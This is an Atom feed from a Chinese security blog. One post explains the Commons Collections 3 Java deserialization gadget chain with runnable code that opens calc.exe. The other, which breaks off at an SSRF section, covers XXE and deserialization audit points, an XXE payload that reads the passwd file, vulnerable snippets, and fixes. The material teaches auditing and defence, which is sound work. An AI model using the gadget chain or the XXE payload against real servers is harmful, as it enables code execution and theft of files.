<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-07-19T14:44:44.840Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CommonsCollections3利用链</title>
    <link href="http://bai-ren-1.github.io/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://bai-ren-1.github.io/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2020-07-19T10:18:39.000Z</published>
    <updated>2020-07-19T14:44:44.840Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3利用链"><a href="#CommonsCollections3利用链" class="headerlink" title="CommonsCollections3利用链"></a>CommonsCollections3利用链</h1><p>2015年最大的漏洞莫过于CommonsCollections反序列化漏洞了。它借用了Java反序列化和Apache Commons Collections这一基础类库，从而实现远程命令执行。然后我下面使用的就是Commons Collections3的版本的方法进行构造调用链，记录一下思路。</p><h2 id="0x00-CommonsCollections调用链执行"><a href="#0x00-CommonsCollections调用链执行" class="headerlink" title="0x00 CommonsCollections调用链执行"></a>0x00 CommonsCollections调用链执行</h2><p>首先在<a href="https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：</a></p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/1.png" alt></p><p>然后我们上面红圈的地方，右键导入后选择”Add as Library”。然后在弹出的窗口中选择OK就可以啦。这一步的目的是将CommonsCollections3中使用的依赖方法进行引入。</p><blockquote><p>所以要使用这个方法攻击服务器需要服务器上存在CommonsCollections3的环境。</p></blockquote><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/2.png" alt></p><p>首先贴上调用链执行的代码和效果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsCollections3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123; String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformeredChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">// 构成调用链：((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null).exec("calc.exe"));</span></span><br><span class="line">        Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        normalMap.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,<span class="keyword">null</span>,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行这段代码就会成功弹出计算器：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/3.png" alt></p><h2 id="0x01-CommonsCollections调用链关键点"><a href="#0x01-CommonsCollections调用链关键点" class="headerlink" title="0x01 CommonsCollections调用链关键点"></a>0x01 CommonsCollections调用链关键点</h2><h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的<strong>第三方基础库</strong>，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p><h3 id="TransformedMap类"><a href="#TransformedMap类" class="headerlink" title="TransformedMap类"></a>TransformedMap类</h3><p>TransformedMap类是Apache CommonsCollections 组件中的一个<strong>实现类</strong>。TransformedMap是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由<strong>Transformer类</strong>定义，Transformer在TransformedMap实例化时作为参数传入。</p><p>我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map transformedMap = TransformedMap.decorate(map,keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure><p><strong>”当TransformedMap内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法。另外，还可以使用Transformer数组构造成ChainedTransformer。当触发时，ChainedTransformer可以按顺序调用一系列的变换。“</strong></p><blockquote><p>第一句解释了代码执行的触发点：TransformedMap的键值对中的值发生改变时就会触发Transformer类中的transform方法中的代码。</p><p>第二据解释了代码调用链的构造：Transformer数组能构成一条链ChainedTransformer，上面代码触发时会链式地调用ChainedTransformer中的方法。</p></blockquote><p>关于上面这两点为何要这么选择？这个链接进行了很好的解释：<a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a></p><h3 id="InvokerTransformer类"><a href="#InvokerTransformer类" class="headerlink" title="InvokerTransformer类"></a>InvokerTransformer类</h3><p>先贴上InvokerTransformer类的构造函数的定义和它的transform方法的定义：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt></p><p>我把需要分析的完整（省略了一部分方法）的代码放在下面，注意注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import org.apache.commons.collections.FunctorException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line">public class InvokerTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = -8653385846894047688L;</span><br><span class="line">    private final String iMethodName;</span><br><span class="line">    private final Class[] iParamTypes;</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// InvokerTransformer的构造方法，可以看到三个用来作为反射参数的成员变量（iMethodName、iParamTypes、iArgs）都是通过构造函数直接赋值的，并未作过滤。</span><br><span class="line">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                // 调用链触发后会执行transform方法，核心就是这里的利用反射特性去调用iMethodName、iParamTypes和iArgs所指的类的方法</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Java反射特性相关的函数：getClass、getMethod、invoke</p><p>getClass：public final Class getClass()，它返回对对象的Class对象的引用。</p><p>getMethod：Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。getMethod的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。</p><p>invoke：Method类的invoke(Object obj,Object args[])方法接收的参数必须为对象，返回值总是对象。用来执行某个的对象的目标方法。</p></blockquote><h3 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h3><p>由于完成Runtime.getRuntime().exec()的动作需要多次调用transform函数（先调用Runtime.getRuntime再调用Runtime.exec），所以还得找一个能多次调用transform的地方。这时候就需要用到ChainedTransformer进行调用类的串联了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private final Transformer[] iTransformers;// 填充构造后的实例</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);// 调用链，</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-CommonsCollections调用链过程"><a href="#0x02-CommonsCollections调用链过程" class="headerlink" title="0x02 CommonsCollections调用链过程"></a>0x02 CommonsCollections调用链过程</h2><p>如果上面的CommonsCollections中的关键点弄清的话，现在就来解释调用链执行弹出计算器的过程。首先解释代码的第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br></pre></td></tr></table></figure><p>这部分的代码其实就只是构建了一个Transformer类的数组，在transformers数组中定义了四个元素：一个ConstantTransformer对象和三个InvokerTransformer对象。这时候我们复习上面提及的InvokerTransformer类的构造方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">this.iMethodName = methodName;</span><br><span class="line">this.iParamTypes = paramTypes;</span><br><span class="line">this.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以数组中三个的InvokerTransformer元素，会把其参数列表中的参数依次根据其构造方法赋值给其内部的iMethodName、iParamTypes、iArgs成员变量。</p><blockquote><p>例如第一个InvokerTransformer元素的参数是：”getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, new Class[0]}），一共三个参数。所以会调用InvokerTransformer类中具有三个参数的构造方法。然后将”getMethod”赋值给iMethodName、将new Class[]{String.class, Class[].class}赋值给iParamTypes、将new Object[]{“getRuntime”, new Class[0]}）赋值给iArgs。</p></blockquote><p>而这三个成员变量恰恰是transform中动态调用的重要依据。</p><p>然后我们分析第二部分代码，第一步的目的也很清晰，就是用transformers数组来实例化成一个ChainedTransformer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformeredChain = new ChainedTransformer(transformers);</span><br><span class="line">        // 构成调用链：((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;,&quot;value&quot;);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,null,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;test&quot;);</span><br></pre></td></tr></table></figure><p>虽然构建一个HashMap类，随便给他设置了一个键值对value-value。</p><blockquote><p>这里写Java的朋友说HashMap其实可以简单理解成python里面的字典。</p></blockquote><p>然后代码通过TransformedMap.decorate()方法，获得一个TransformedMap。随后我们通过entry来遍历整个HashMap获取里面的元素。然后我们只要把其中一个键值对改变，就会像第二篇章说的一样：触发transformeredChain（即transformers数组）中每个元素的transform方法，从而利用transform中的反射获取需要的类方法并因为transformeredChain的多次调用而构成一整条调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br></pre></td></tr></table></figure><blockquote><p>调用：使用了反射特性；链：根据transformeredChain中的多次调用形成调用链；触发点：TransformedMap中的键值对被改变。</p></blockquote><p>我们可以做个简单实验，只要注释掉重新赋值value的语句entry.setValue(“test”)，代码并不触发：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/6.png" alt></p><p>去掉注释就会触发调用链重新打开计算器了：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/7.png" alt></p><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里只是梳理了Commons Collections3这条链的前因后果，因为写的头昏眼花啦，这篇等我后面再补齐剩余的内同。然后就是找到Java触发反序列化的点简单，关键是如何<strong>找到可利用的调用链</strong>。这个作为最经典的一条调用链，我就先说到这里了。下次继续补齐并写其他调用链。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CommonsCollections3利用链&quot;&gt;&lt;a href=&quot;#CommonsCollections3利用链&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections3利用链&quot;&gt;&lt;/a&gt;CommonsCollections3利
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java敏感函数</title>
    <link href="http://bai-ren-1.github.io/2020/07/16/Java%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/"/>
    <id>http://bai-ren-1.github.io/2020/07/16/Java%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/</id>
    <published>2020-07-16T13:31:34.000Z</published>
    <updated>2020-07-16T13:37:46.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java敏感函数"><a href="#Java敏感函数" class="headerlink" title="Java敏感函数"></a>Java敏感函数</h1><p>因为最近开发插件见到了很多敏感函数，记录记录。</p><h2 id="0x00-XXE"><a href="#0x00-XXE" class="headerlink" title="0x00 XXE"></a>0x00 XXE</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。文档类型定义(DTD)的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><ul><li>内部声明DTD:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><ul><li>引用外部DTD:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>当允许引用外部实体时，恶意攻击者即可构造恶意内容访问服务器资源,如读取passwd文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE replace [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY test SYSTEM "file:///ect/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以org.dom4j.io.SAXReader为例，仅展示部分代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String xmldata = request.getParameter(<span class="string">"data"</span>);</span><br><span class="line">SAXReader sax = <span class="keyword">new</span> SAXReader();</span><br><span class="line"><span class="comment">// 创建一个SAXReader对象</span></span><br><span class="line">Document document = sax.read(<span class="keyword">new</span> ByteArrayInputStream(xmldata.getBytes()));</span><br><span class="line"><span class="comment">// 获取document对象,如果文档无节点，则会抛出Exception提前结束</span></span><br><span class="line">Element root = document.getRootElement(); <span class="comment">//获取根节点</span></span><br><span class="line">List rowList = root.selectNodes(<span class="string">"//msg"</span>);</span><br><span class="line">Iterator&lt;?&gt; iter1 = rowList.iterator();</span><br><span class="line"><span class="keyword">if</span> (iter1.hasNext()) &#123;</span><br><span class="line">    Element beanNode = (Element) iter1.next();</span><br><span class="line">    modelMap.put(<span class="string">"success"</span>,<span class="keyword">true</span>);</span><br><span class="line">    modelMap.put(<span class="string">"resp"</span>,beanNode.getTextTrim());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="审计函数"><a href="#审计函数" class="headerlink" title="审计函数"></a>审计函数</h3><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可留意下XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader </span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource </span><br><span class="line">javax.xml.transform.TransformerFactory </span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory </span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathExpression</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>使用XML解析器时需要设置其属性，禁止使用外部实体，以上例中SAXReader为例，安全的使用方式如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sax.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">sax.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sax.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>其它XML解析器的安全使用可参考<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet#Java" target="_blank" rel="noopener">OWASP XML External Entity (XXE) Prevention Cheat Sheet</a></p><h2 id="0x01-反序列化漏洞"><a href="#0x01-反序列化漏洞" class="headerlink" title="0x01 反序列化漏洞"></a>0x01 反序列化漏洞</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 </p><p>Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h3 id="漏洞示例-1"><a href="#漏洞示例-1" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>漏洞代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//读取输入流,并转换对象</span></span><br><span class="line">InputStream in=request.getInputStream();</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure><p>上述代码中，程序读取输入流并将其反序列化为对象。此时可查看项目工程中是否引入可利用的commons-collections 3.1、commons-fileupload 1.3.1等第三方库，即可构造特定反序列化对象实现任意代码执行。相关三方库及利用工具可参考ysoserial、marshalsec。</p><h3 id="审计函数-1"><a href="#审计函数-1" class="headerlink" title="审计函数"></a>审计函数</h3><p>反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>如果可以明确反序列化对象类的则可在反序列化时设置白名单，对于一些只提供接口的库则可使用黑名单设置不允许被反序列化类或者提供设置白名单的接口，可通过Hook函数resolveClass来校验反序列化的类从而实现白名单校验，示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化SerialObject class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(SerialObject<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                    <span class="string">"Unauthorized deserialization attempt"</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，如果使用的是第三方库则升级到最新版本。更多修复方案可参考<a href="https://xianzhi.aliyun.com/forum/topic/41/" target="_blank" rel="noopener">浅谈Java反序列化漏洞修复方案</a>。</p><h2 id="0x02-SSRF"><a href="#0x02-SSRF" class="headerlink" title="0x02 SSRF"></a>0x02 SSRF</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>SSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。</p><h3 id="漏洞示例-2"><a href="#漏洞示例-2" class="headerlink" 